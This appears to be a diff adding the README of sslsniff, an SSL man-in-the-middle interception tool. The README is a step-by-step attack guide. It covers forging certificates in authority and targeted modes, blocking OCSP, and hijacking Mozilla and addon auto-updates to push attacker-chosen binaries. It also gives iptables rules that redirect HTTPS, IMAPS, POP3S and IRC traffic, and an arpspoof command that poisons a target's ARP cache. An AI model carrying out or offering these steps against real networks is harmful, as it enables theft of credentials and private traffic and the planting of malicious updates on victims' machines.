@@ -1,0 +1,136 @@
+sslsniff v0.7
+Moxie Marlinspike <moxie@thoughtcrime.org>
+------------------------------------
+
+REQUIRES: openssl, libboost1.35-dev, libboost-filesystem1.35-dev, 
+          libboost-thread1.35-dev, liblog4cpp5-dev, Linux 2.4/2.6 (or BSD)
+
+The three steps to get this running are:
+
+    * Download and run sslsniff-0.6.tar.gz
+    * Setup iptables (or pf on BSD)
+    * Run arpspoof (or whatever method you'd like to use to redirect traffic).
+
+Installing sslsniff
+-------------------
+
+    * Unpack sslsniff-0.6.tar.gz, run "./configure" and "make". (You'll have
+      to make some changes to build on BSD systems, see below under "Setting up 
+      pf")
+    * There are two ways to run this: in "authority" mode or "targeted" mode.
+
+    Authority Mode:
+
+    In this mode, sslsniff acts as if it is a CA which dynamically generates
+    certificates on the fly.  If you were, for instance, able to obtain a CA
+    certificate somehow, you could run it in this mode and it would dynamically
+    create and sign new certificates for whatever site you're trying to connect
+    to.
+
+    This mode is also useful for exploiting implementations that do not properly
+    verify BasicConstraints, as any valid leaf node certificate could be used
+    instead of a CA cert.
+
+    You would run sslsniff as: 
+    ./sslsniff -a -p <$listenPort> -w <$logFile> -c <$caCert>
+
+    Targeted Mode:
+
+    In this mode, sslsniff is given a directory full of certificates, which it 
+    uses for targeted MITM attacks against the hosts those certificates are 
+    signed for.  This mode is useful if you are able to forge specific 
+    certificates, or if you have certificates that were obtained for the "null 
+    prefix" vulnerability that I published.  There are sample null prefix 
+    certificates in the "certs" directory that comes with sslsniff, but be
+    sure to specify "-m IPSCACLASEA1.crt" if you wish to use those. (Note:
+    the targeted certs have been removed for legal reasons, but the universal
+    wildcard cert remains)
+
+    You would run sslsniff as: 
+    ./sslsniff -t -p <$listenPort> -w <$logFile> -m IPSCACLASEA1.crt \
+      -c <$certDir>
+
+    Other options:
+    
+    * sslsniff can be configured to only attack certain clients.  In this case, 
+      you need to specify -f <ff,ie,safari,opera> -h <$httpListenPort> 
+    
+    * sslsniff can be configured to deny OCSP requests from clients.  In this 
+      case, you need to specify -d
+
+    * sslsniff can be configured to only log HTTP POSTS.  In this case, you 
+      need to specify -p
+
+    * sslsniff can be configured to hijack Mozilla auto-updates.  In this case, 
+      you need to specify -u <$updateXmlDir>, where $updateXmlDir contains the 
+      XML files for whatever binaries you want to have sslsniff auto-update, 
+      one for each platform.  There are sample XML files in the "update" 
+      directory that comes with sslsniff.
+
+    * sslsniff can be configured to hijack Firefox/Thunderbird addon 
+      auto-updates. In this case, you need to specify -e <url> -j <sha256sum> 
+      where <url> is the URL where your custom addon is located, and <sha256sum> 
+      is the sha256sum of that addon.
+
+
+Setting up iptables
+-------------------
+
+    * Flip your machine into ip_forward mode 
+      (echo 1 > /proc/sys/net/ipv4/ip_forward)
+
+    * Add a rule to intercept HTTPS traffic 
+      (iptables -t nat -A PREROUTING -p tcp --destination-port 443
+       -j REDIRECT --to-ports <$listenPort>)
+
+    * If you're going to do client fingerprinting, add a rule to
+      intercept HTTP traffic:
+      (iptables -t nat -A PREROUTING -p tcp --destination-port 80
+      -j REDIRECT --to-ports <$httpListenPort>)
+
+    * Add a rule to intercept imaps traffic:
+      (iptables -t nat -A PREROUTING -p tcp --destination-port 993 \
+       -j REDIRECT --to-ports <$listenPort>)
+
+    * Add a rule to intercept pop3s traffic:
+      (iptables -t nat -A PREROUTING -p tcp --destination-port 995 \
+       -j REDIRECT --to-ports <$listenPort>)
+
+    * Add a rule to intercept irc over ssl traffic:
+      (iptables -t nat -A PREROUTING -p tcp --destination-port 6697 \
+       -j REDIRECT --to-ports <$listenPort>)
+
+Setting up pf
+-------------
+
+Basic support for pf is now included. Set up firewall rules similar to
+those above, and change util/Destination.cpp by undefining HAVE_NETFILTER
+and defining HAVE_PF at the top.
+
+
+Running arpspoof
+--------------------------
+
+Assuming we want to intercept SSL traffic from 172.17.10.36, we need to 
+trick that host into thinking that we're the router.  Using arpspoof, we 
+can convince the target that the router's MAC address is our MAC address.
+
+    * arpspoof -i eth0 -t 172.17.10.36 172.17.8.1
+
+At this point, any SSL traffic should get proxied by sslsniff and logged to 
+a file.
+
+How does this work?
+-------------------
+
+First, arpspoof convinces a host that our MAC address is the router's MAC 
+address, and the target begins to send us all its network traffic.  The 
+kernel forwards everything along except for traffic destined to port 443, 
+which it redirects to $listenPort (10000, for example).
+
+At this point, sslsniff receives the client connection, makes a connection 
+to the real SSL site, and looks at the information in its certificate.  
+sslsniff then either sends a forged certificate if available 
+(targeted certificate mode), or it dynamically forges a certificate and signs
+it with your authoritative certificate (authority mode).
+
